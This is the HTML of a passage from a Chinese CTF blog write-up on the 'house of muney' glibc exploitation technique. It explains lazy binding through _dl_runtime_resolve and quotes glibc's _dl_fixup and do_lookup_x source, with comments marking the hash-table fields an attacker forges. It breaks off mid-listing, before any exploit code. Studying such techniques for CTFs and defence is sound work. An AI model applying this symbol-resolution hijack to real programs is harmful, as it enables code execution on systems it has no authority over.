@@ -1,0 +1,808 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/wod.jpg">
+  <link rel="icon" href="/img/wod.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CH13hh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="house_of_muney首先介绍一下house of muney 这个利用原理： 在了解过_dl_runtime_resolve的前提下，当程序保护开了延迟绑定的时候，程序第一次调用相关函数的时候会执行下面的命令 123push npush ModuleIDjmp _dl_runtime_resolve  这里的n对应的是这个符号在rel.plt重定位表中的下标然后第二个MoudleID则一般">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_muney[CISCN]">
+<meta property="og:url" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/index.html">
+<meta property="og:site_name" content="CH13hh">
+<meta property="og:description" content="house_of_muney首先介绍一下house of muney 这个利用原理： 在了解过_dl_runtime_resolve的前提下，当程序保护开了延迟绑定的时候，程序第一次调用相关函数的时候会执行下面的命令 123push npush ModuleIDjmp _dl_runtime_resolve  这里的n对应的是这个符号在rel.plt重定位表中的下标然后第二个MoudleID则一般">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008210347892-1068838240.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008210533465-107616031.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008210630785-1670921104.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008211015877-1316564914.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008211323413-819499018.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008211403813-1820987043.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009181944247-1670551721.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182201844-1749150943.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182305126-1445116192.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182428355-426809747.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182611789-194531855.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182714287-1333394139.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182754029-1445708882.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009182828547-1948811624.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009183057264-1232943883.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009183148046-2051995952.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009214617372-1605166769.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009215213550-304357691.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009215220605-1011567680.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009215943672-335769811.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241009222548326-1993525860.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241010001032702-1654813537.png">
+<meta property="article:published_time" content="2024-10-09T16:21:43.000Z">
+<meta property="article:modified_time" content="2024-10-09T16:23:25.088Z">
+<meta property="article:author" content="CH13hh">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ch13hh.github.io/2024/10/10/house-of-muney-CISCN/3419447-20241008210347892-1068838240.png">
+  
+  
+  
+  <title>house_of_muney[CISCN] - CH13hh</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ch13hh.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","app_key":"idRJngxDPrsuLA4G1dKyEewP","server_url":"https://awdkxtm4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CH13hh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zhuye.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="house_of_muney[CISCN]"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-10 00:21" pubdate>
+          2024年10月10日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">house_of_muney[CISCN]</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="house-of-muney"><a href="#house-of-muney" class="headerlink" title="house_of_muney"></a><strong>house_of_muney</strong></h2><p><strong>首先介绍一下house of muney 这个利用原理：</strong></p>
+<p><strong>在了解过_dl_runtime_resolve的前提下，当程序保护开了延迟绑定的时候，程序第一次调用相关函数的时候会执行下面的命令</strong></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">push</span> n<br><span class="hljs-keyword">push</span> ModuleID<br><span class="hljs-symbol">jmp</span> _dl_runtime_resolve<br></code></pre></td></tr></table></figure>
+
+<p><strong>这里的<code>n</code>对应的是这个符号在<code>rel.plt</code>重定位表中的下标然后第二个<code>MoudleID</code>则一般是本程序的<code>link_map</code>结构体的地址，解析来就进入到了<code>_dl_runtime_resolve</code>函数</strong> </p>
+<p><strong>我们来看看这个函数做了什么</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This function is called through a special trampoline from the PLT the first time each PLT entry is called.  We must perform the relocation specified in the PLT of the given shared object, and return the resolved function address to the trampoline, which will restart the original call to that address.Future calls will bounce directly from the PLT to the</span><br><span class="hljs-comment">   function.  */</span><br><br>DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>	   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum =<br>	    (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = &amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>      RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>				   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>可以看见又继续调用<code>_dl_lookup_symbol_x</code>这个函数 ，它会开始在link_map寻找符号，实际上调用了<code>do_lookup_x</code></strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c">* Inner part of the lookup functions.  We <span class="hljs-keyword">return</span> a value &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> we<br>   found the symbol, the value <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> nothing is found and &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">if</span><br>   something bad happened.  */<br><span class="hljs-type">static</span> <span class="hljs-type">int</span><br>__attribute_noinline__<br>do_lookup_x (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *undef_name, <span class="hljs-type">uint_fast32_t</span> new_hash,<br>	     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *old_hash, <span class="hljs-type">const</span> ElfW(Sym) *ref,<br>	     <span class="hljs-keyword">struct</span> sym_val *result, <span class="hljs-keyword">struct</span> r_scope_elem *scope, <span class="hljs-type">size_t</span> i,<br>	     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> r_found_version *<span class="hljs-type">const</span> version, <span class="hljs-type">int</span> flags,<br>	     <span class="hljs-keyword">struct</span> link_map *skip, <span class="hljs-type">int</span> type_class, <span class="hljs-keyword">struct</span> link_map *undef_map)<br>&#123;<br>  <span class="hljs-type">size_t</span> n = scope-&gt;r_nlist;<br>  <span class="hljs-comment">/* Make sure we read the value before proceeding.  Otherwise we</span><br><span class="hljs-comment">     might use r_list pointing to the initial scope and r_nlist being</span><br><span class="hljs-comment">     the value after a resize.  That is the only path in dl-open.c not</span><br><span class="hljs-comment">     protected by GSCOPE.  A read barrier here might be to expensive.  */</span><br>  __asm <span class="hljs-title function_">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;+r&quot;</span> (n), <span class="hljs-string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> **<span class="hljs-title">list</span> =</span> scope-&gt;r_list;<br><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">map</span> =</span> <span class="hljs-built_in">list</span>[i]-&gt;l_real;<br><br>      <span class="hljs-comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span> == skip)<br>	<span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Don&#x27;t search the executable when resolving a copy reloc.  */</span><br>      <span class="hljs-keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="hljs-built_in">map</span>-&gt;l_type == lt_executable)<br>	<span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Do not look into objects which are going to be removed.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_removed)<br>	<span class="hljs-keyword">continue</span>;<br><br>      <span class="hljs-comment">/* Print some debugging info if wanted.  */</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))<br>	_dl_debug_printf (<span class="hljs-string">&quot;symbol=%s;  lookup in file=%s [%lu]\n&quot;</span>,<br>			  undef_name, DSO_FILENAME (<span class="hljs-built_in">map</span>-&gt;l_name),<br>			  <span class="hljs-built_in">map</span>-&gt;l_ns);<br><br>      <span class="hljs-comment">/* If the hash table is empty there is nothing to do here.  */</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;l_nbuckets == <span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">continue</span>;<br><br>      Elf_Symndx symidx;<br>      <span class="hljs-type">int</span> num_versions = <span class="hljs-number">0</span>;<br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *versioned_sym = <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-comment">/* The tables for this map.  */</span><br>      <span class="hljs-comment">// 找到符号表和字符串表（当前link_map）</span><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_SYMTAB]);<br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (<span class="hljs-built_in">map</span>, l_info[DT_STRTAB]);<br><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym;<br>      <span class="hljs-comment">// 获取bitmask</span><br>      <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Addr)</span> *bitmask = <span class="hljs-built_in">map</span>-&gt;l_gnu_bitmask;<br>      <span class="hljs-keyword">if</span> (__glibc_likely (bitmask != <span class="hljs-literal">NULL</span>))<br>	&#123;<br>      <span class="hljs-comment">// 获取bitmask_word，这里需要伪造</span><br>	  ElfW(Addr) bitmask_word<br>	    = bitmask[(new_hash / __ELF_NATIVE_CLASS)<br>		      &amp; <span class="hljs-built_in">map</span>-&gt;l_gnu_bitmask_idxbits];<br><br>	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="hljs-number">1</span>);<br>	  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="hljs-built_in">map</span>-&gt;l_gnu_shift)<br>				   &amp; (__ELF_NATIVE_CLASS - <span class="hljs-number">1</span>));<br><br>	  <span class="hljs-keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)<br>				&amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="hljs-number">1</span>))<br>	    &#123;<br>          <span class="hljs-comment">// 获取bucket，这里需要伪造</span><br>	      Elf32_Word bucket = <span class="hljs-built_in">map</span>-&gt;l_gnu_buckets[new_hash<br>						     % <span class="hljs-built_in">map</span>-&gt;l_nbuckets];<br>	      <span 